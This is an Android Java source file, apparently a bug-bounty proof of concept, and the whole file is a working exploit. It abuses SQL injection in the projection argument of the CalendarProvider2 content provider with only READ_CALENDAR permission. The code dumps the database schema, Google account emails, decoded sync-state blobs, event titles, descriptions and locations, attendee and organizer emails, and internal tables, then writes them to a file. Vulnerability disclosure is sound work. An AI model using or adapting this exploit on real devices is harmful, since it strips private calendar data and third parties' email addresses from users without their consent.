package com.vrp.poc;

import android.app.Activity;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.widget.ScrollView;
import android.widget.LinearLayout;
import android.widget.TextView;
import java.io.File;
import java.io.FileWriter;
import java.io.PrintWriter;

public class CalendarFullDumpActivity extends Activity {
    private static final String TAG = "CalFullDump";
    private static final Uri EVENTS_URI = Uri.parse("content://com.android.calendar/events");
    private TextView logView;
    private PrintWriter fileOut;
    private StringBuilder allData = new StringBuilder();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        ScrollView sv = new ScrollView(this);
        LinearLayout ll = new LinearLayout(this);
        ll.setOrientation(LinearLayout.VERTICAL);
        ll.setPadding(20, 20, 20, 20);
        logView = new TextView(this);
        logView.setTextSize(7);
        logView.setText("CalendarProvider2 FULL DATABASE DUMP via SQL Injection\n");
        logView.append("UID: " + android.os.Process.myUid() + " | Pkg: " + getPackageName() + "\n");
        logView.append("Permission: READ_CALENDAR ONLY\n\n");
        ll.addView(logView);
        sv.addView(ll);
        setContentView(sv);

        try {
            File f = new File(getFilesDir(), "calendar_full_dump.txt");
            fileOut = new PrintWriter(new FileWriter(f));
            log("Output file: " + f.getAbsolutePath());
        } catch (Exception e) {
            log("Cannot create output file: " + e.getMessage());
        }

        new Thread(this::runFullDump).start();
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (fileOut != null) fileOut.close();
    }

    private void log(String msg) {
        Log.d(TAG, msg);
        if (fileOut != null) { fileOut.println(msg); fileOut.flush(); }
        runOnUiThread(() -> logView.append(msg + "\n"));
    }

    private void runFullDump() {
        long start = System.currentTimeMillis();

        log("╔══════════════════════════════════════════╗");
        log("║  MAXIMUM IMPACT PROOF: CalendarProvider2 ║");
        log("║  SQL Injection via Projection + SortOrder║");
        log("╚══════════════════════════════════════════╝\n");

        log("━━━ 1. FULL SCHEMA DUMP (sqlite_master) ━━━");
        dumpSchema();

        log("\n━━━ 2. ALL GOOGLE ACCOUNT EMAILS ━━━");
        dumpAccountEmails();

        log("\n━━━ 3. FULL _sync_state DUMP ━━━");
        dumpSyncState();

        log("\n━━━ 4. ALL CALENDAR DETAILS ━━━");
        dumpCalendars();

        log("\n━━━ 5. ALL EVENT TITLES + DESCRIPTIONS + LOCATIONS ━━━");
        dumpEvents();

        log("\n━━━ 6. ALL ATTENDEE EMAILS ━━━");
        dumpAttendees();

        log("\n━━━ 7. ALL ORGANIZER EMAILS ━━━");
        dumpOrganizers();

        log("\n━━━ 8. ALL EXTENDED PROPERTIES ━━━");
        dumpExtendedProperties();

        log("\n━━━ 9. CalendarMetaData ━━━");
        dumpCalendarMetaData();

        log("\n━━━ 10. CalendarCache (ALL entries) ━━━");
        dumpCalendarCache();

        log("\n━━━ 11. _sync_state_metadata ━━━");
        dumpSyncStateMetadata();

        log("\n━━━ 12. EVENT SYNC IDs (Google Calendar API identifiers) ━━━");
        dumpEventSyncIds();

        log("\n━━━ 13. CALENDAR SUBSCRIPTION URLs ━━━");
        dumpCalendarUrls();

        log("\n━━━ 14. REMINDERS DATA ━━━");
        dumpReminders();

        log("\n━━━ 15. CALENDAR ALERTS ━━━");
        dumpCalendarAlerts();

        log("\n━━━ 16. COLORS TABLE ━━━");
        dumpColors();

        log("\n━━━ 17. SQLITE SEQUENCE (autoincrement state) ━━━");
        dumpSqliteSequence();

        long elapsed = System.currentTimeMillis() - start;
        log("\n╔══════════════════════════════════════════╗");
        log("║  DUMP COMPLETE — " + elapsed + "ms total            ║");
        log("╚══════════════════════════════════════════╝");

        log("\nData written to: " + getFilesDir() + "/calendar_full_dump.txt");
        log("ALL DATA EXTRACTED VIA READ_CALENDAR ONLY.");
        log("Internal tables (_sync_state, CalendarMetaData,");
        log("CalendarCache) have NO public ContentProvider URI.");
    }

    private void dumpSchema() {
        log("[*] Extracting CREATE TABLE statements for all tables...");
        String proj = "(SELECT group_concat(sql, char(10)) FROM sqlite_master WHERE type='table') AS schema_dump";
        String result = projectionQuery(proj);
        if (result != null) {
            for (String line : result.split("\n")) {
                log("  " + line);
            }
        }

        log("\n[*] Extracting all indexes...");
        String idxProj = "(SELECT group_concat(sql, char(10)) FROM sqlite_master WHERE type='index' AND sql IS NOT NULL) AS index_dump";
        String indexes = projectionQuery(idxProj);
        if (indexes != null) {
            for (String line : indexes.split("\n")) {
                log("  " + line);
            }
        }

        log("\n[*] Extracting all triggers...");
        String trigProj = "(SELECT group_concat(name || ': ' || sql, char(10)) FROM sqlite_master WHERE type='trigger') AS trigger_dump";
        String triggers = projectionQuery(trigProj);
        if (triggers != null) {
            for (String line : triggers.split("\n")) {
                log("  " + line);
            }
        }
    }

    private void dumpAccountEmails() {
        String proj = "(SELECT group_concat(DISTINCT account_name) FROM Calendars) AS all_accounts";
        String result = projectionQuery(proj);
        log("  Accounts: " + result);

        String proj2 = "(SELECT group_concat(DISTINCT account_name || ' [' || account_type || ']') FROM Calendars) AS typed_accounts";
        String result2 = projectionQuery(proj2);
        log("  With types: " + result2);

        String proj3 = "(SELECT group_concat(DISTINCT ownerAccount) FROM Calendars) AS owners";
        String result3 = projectionQuery(proj3);
        log("  Calendar owners: " + result3);
    }

    private void dumpSyncState() {
        String countProj = "(SELECT count(*) FROM _sync_state) AS sync_count";
        String count = projectionQuery(countProj);
        log("  _sync_state rows: " + count);

        String proj = "(SELECT group_concat(account_name || '|' || account_type || '|length=' || length(data), char(10)) FROM _sync_state) AS sync_accounts";
        String result = projectionQuery(proj);
        log("  Accounts: " + result);

        String blobProj = "(SELECT hex(data) FROM _sync_state LIMIT 1) AS sync_blob";
        String hexBlob = projectionQuery(blobProj);
        if (hexBlob != null) {
            log("  Raw hex length: " + hexBlob.length() + " chars (" + hexBlob.length()/2 + " bytes)");
            String decoded = hexToAscii(hexBlob);
            log("  DECODED SYNC DATA:");
            int chunk = 120;
            for (int i = 0; i < decoded.length(); i += chunk) {
                log("    " + decoded.substring(i, Math.min(i + chunk, decoded.length())));
            }
        }

        for (int row = 0; row < 5; row++) {
            String rowProj = "(SELECT hex(data) FROM _sync_state LIMIT 1 OFFSET " + row + ") AS blob_" + row;
            String blob = projectionQuery(rowProj);
            if (blob == null || blob.isEmpty()) break;
            if (row > 0) {
                log("  _sync_state row " + row + " (" + blob.length()/2 + " bytes):");
                log("    " + hexToAscii(blob));
            }
        }
    }

    private void dumpCalendars() {
        String proj = "(SELECT count(*) FROM Calendars) AS cal_count";
        log("  Total calendars: " + projectionQuery(proj));

        for (int i = 0; i < 20; i++) {
            String calProj = "(SELECT _id||'|'||account_name||'|'||name||'|'||calendar_displayName||'|'||ownerAccount||'|'||account_type FROM Calendars LIMIT 1 OFFSET " + i + ") AS cal_" + i;
            String cal = projectionQuery(calProj);
            if (cal == null || cal.isEmpty()) break;
            log("  Calendar[" + i + "]: " + cal);
        }

        log("\n  [*] Calendar sync URLs (cal_sync1)...");
        String syncUrlProj = "(SELECT group_concat(_id || ': ' || COALESCE(cal_sync1,'null'), char(10)) FROM Calendars) AS sync_urls";
        String syncUrls = projectionQuery(syncUrlProj);
        if (syncUrls != null) {
            for (String line : syncUrls.split("\n")) {
                log("    " + line);
            }
        }
    }

    private void dumpEvents() {
        String countProj = "(SELECT count(*) FROM Events) AS event_count";
        String count = projectionQuery(countProj);
        log("  Total events: " + count);

        int total = 0;
        try { total = Integer.parseInt(count); } catch (Exception e) {}

        int limit = Math.min(total, 50);
        for (int i = 0; i < limit; i++) {
            String evProj = "(SELECT _id||'|'||COALESCE(title,'[no title]')||'|'||COALESCE(eventLocation,'[no loc]')||'|'||COALESCE(description,'[no desc]')||'|'||dtstart||'|'||COALESCE(organizer,'') FROM Events LIMIT 1 OFFSET " + i + ") AS ev_" + i;
            String ev = projectionQuery(evProj);
            if (ev == null || ev.isEmpty()) break;
            log("  Event[" + i + "]: " + ev);
        }
        if (total > 50) {
            log("  ... (" + (total - 50) + " more events available)");
        }
    }

    private void dumpAttendees() {
        String countProj = "(SELECT count(*) FROM Attendees) AS att_count";
        String count = projectionQuery(countProj);
        log("  Total attendee records: " + count);

        String distinctProj = "(SELECT count(DISTINCT attendeeEmail) FROM Attendees) AS distinct_emails";
        String distinct = projectionQuery(distinctProj);
        log("  Distinct attendee emails: " + distinct);

        String emailsProj = "(SELECT group_concat(DISTINCT attendeeEmail) FROM Attendees) AS all_emails";
        String emails = projectionQuery(emailsProj);
        if (emails != null) {
            log("  ALL ATTENDEE EMAILS:");
            for (String email : emails.split(",")) {
                log("    → " + email.trim());
            }
        }

        for (int i = 0; i < 30; i++) {
            String attProj = "(SELECT event_id||'|'||attendeeEmail||'|'||attendeeName||'|'||attendeeStatus FROM Attendees LIMIT 1 OFFSET " + i + ") AS att_" + i;
            String att = projectionQuery(attProj);
            if (att == null || att.isEmpty()) break;
            log("  Attendee[" + i + "]: " + att);
        }
    }

    private void dumpOrganizers() {
        String proj = "(SELECT group_concat(DISTINCT organizer) FROM Events WHERE organizer IS NOT NULL) AS organizers";
        String result = projectionQuery(proj);
        if (result != null) {
            log("  ALL ORGANIZER EMAILS:");
            for (String org : result.split(",")) {
                log("    → " + org.trim());
            }
        }
    }

    private void dumpExtendedProperties() {
        String countProj = "(SELECT count(*) FROM ExtendedProperties) AS ext_count";
        String count = projectionQuery(countProj);
        log("  Total extended properties: " + count);

        for (int i = 0; i < 30; i++) {
            String extProj = "(SELECT event_id||'|'||name||'|'||value FROM ExtendedProperties LIMIT 1 OFFSET " + i + ") AS ext_" + i;
            String ext = projectionQuery(extProj);
            if (ext == null || ext.isEmpty()) break;
            log("  ExtProp[" + i + "]: " + ext);
        }
    }

    private void dumpCalendarMetaData() {
        String countProj = "(SELECT count(*) FROM CalendarMetaData) AS meta_count";
        log("  CalendarMetaData rows: " + projectionQuery(countProj));

        for (int i = 0; i < 5; i++) {
            String metaProj = "(SELECT _id||'|tz='||localTimezone||'|minInst='||minInstance||'|maxInst='||maxInstance FROM CalendarMetaData LIMIT 1 OFFSET " + i + ") AS meta_" + i;
            String meta = projectionQuery(metaProj);
            if (meta == null || meta.isEmpty()) break;
            log("  MetaData[" + i + "]: " + meta);
        }
    }

    private void dumpCalendarCache() {
        String countProj = "(SELECT count(*) FROM CalendarCache) AS cache_count";
        log("  CalendarCache rows: " + projectionQuery(countProj));

        String allProj = "(SELECT group_concat(key || ' = ' || value, char(10)) FROM CalendarCache) AS cache_data";
        String cacheData = projectionQuery(allProj);
        if (cacheData != null) {
            for (String line : cacheData.split("\n")) {
                log("  " + line);
            }
        }
    }

    private void dumpSyncStateMetadata() {
        String countProj = "(SELECT count(*) FROM _sync_state_metadata) AS ssm_count";
        log("  _sync_state_metadata rows: " + projectionQuery(countProj));

        for (int i = 0; i < 5; i++) {
            String ssmProj = "(SELECT hex(data) FROM _sync_state_metadata LIMIT 1 OFFSET " + i + ") AS ssm_" + i;
            String ssm = projectionQuery(ssmProj);
            if (ssm == null || ssm.isEmpty()) break;
            log("  Metadata[" + i + "] hex: " + ssm);
            log("  Metadata[" + i + "] decoded: " + hexToAscii(ssm));
        }
    }

    private void dumpEventSyncIds() {
        String proj = "(SELECT group_concat(DISTINCT _sync_id, char(10)) FROM Events WHERE _sync_id IS NOT NULL) AS sync_ids";
        String result = projectionQuery(proj);
        if (result != null) {
            String[] ids = result.split("\n");
            log("  Total sync IDs: " + ids.length);
            for (int i = 0; i < Math.min(ids.length, 30); i++) {
                log("  SyncID[" + i + "]: " + ids[i]);
            }
            if (ids.length > 30) log("  ... (" + (ids.length - 30) + " more)");
        }
    }

    private void dumpCalendarUrls() {
        String proj = "(SELECT group_concat(_id || ': sync1=' || COALESCE(cal_sync1,'null') || ' | sync2=' || COALESCE(cal_sync2,'null') || ' | sync3=' || COALESCE(cal_sync3,'null'), char(10)) FROM Calendars) AS cal_sync_data";
        String result = projectionQuery(proj);
        if (result != null) {
            for (String line : result.split("\n")) {
                log("  " + line);
            }
        }
    }

    private void dumpReminders() {
        String countProj = "(SELECT count(*) FROM Reminders) AS rem_count";
        log("  Total reminders: " + projectionQuery(countProj));

        for (int i = 0; i < 20; i++) {
            String remProj = "(SELECT event_id||'|method='||method||'|minutes='||minutes FROM Reminders LIMIT 1 OFFSET " + i + ") AS rem_" + i;
            String rem = projectionQuery(remProj);
            if (rem == null || rem.isEmpty()) break;
            log("  Reminder[" + i + "]: " + rem);
        }
    }

    private void dumpCalendarAlerts() {
        String countProj = "(SELECT count(*) FROM CalendarAlerts) AS alert_count";
        log("  Total alerts: " + projectionQuery(countProj));

        for (int i = 0; i < 20; i++) {
            String alertProj = "(SELECT event_id||'|begin='||begin||'|end='||end||'|state='||state FROM CalendarAlerts LIMIT 1 OFFSET " + i + ") AS alert_" + i;
            String alert = projectionQuery(alertProj);
            if (alert == null || alert.isEmpty()) break;
            log("  Alert[" + i + "]: " + alert);
        }
    }

    private void dumpColors() {
        String countProj = "(SELECT count(*) FROM Colors) AS color_count";
        log("  Total color entries: " + projectionQuery(countProj));

        String colProj = "(SELECT group_concat(account_name||'|'||account_type||'|type='||color_type||'|key='||color_key, char(10)) FROM Colors) AS color_data";
        String colors = projectionQuery(colProj);
        if (colors != null) {
            for (String line : colors.split("\n")) {
                log("  " + line);
            }
        }
    }

    private void dumpSqliteSequence() {
        String proj = "(SELECT group_concat(name || '=' || seq, ', ') FROM sqlite_sequence) AS seq_data";
        String result = projectionQuery(proj);
        log("  " + result);
    }

    private String projectionQuery(String projectionExpr) {
        try {
            Cursor c = getContentResolver().query(
                EVENTS_URI,
                new String[]{projectionExpr},
                null, null,
                "_id LIMIT 1"
            );
            if (c != null) {
                String val = null;
                if (c.moveToFirst()) {
                    val = c.getString(0);
                }
                c.close();
                return val;
            }
        } catch (Exception e) {
            log("  ERROR: " + e.getClass().getSimpleName() + ": " + e.getMessage());
        }
        return null;
    }

    private String hexToAscii(String hex) {
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < hex.length() - 1; i += 2) {
            try {
                int val = Integer.parseInt(hex.substring(i, i + 2), 16);
                sb.append(val >= 32 && val < 127 ? (char) val : '.');
            } catch (NumberFormatException e) {
                sb.append('?');
            }
        }
        return sb.toString();
    }
}
